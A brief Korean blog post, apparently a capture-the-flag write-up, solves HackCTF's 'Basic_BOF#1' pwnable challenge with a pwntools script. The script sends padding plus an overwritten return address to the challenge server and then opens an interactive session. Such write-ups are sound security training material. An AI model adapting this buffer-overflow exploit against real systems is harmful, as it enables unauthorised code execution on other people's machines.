---
title: "[HackCtf] Basic_BOF#1"
date: 2020-06-29
ctf: HackCTF
tag: [pwnable]
layout: post
---

<span class="color-blue">HackCTF</span>의 첫 번째 <span class="color-blue">Pwnable</span> 문제로 <span class="color-blue">bof</span>를 이용한다.
{% highlight python %}
from pwn import *
context.log_level="debug"
p = remote("ctf.j0n9hyun.xyz", 3004)

payload = "a"*0x118
payload+= p64(0x400606)

p.sendline(payload)

p.interactive()
{% endhighlight %}
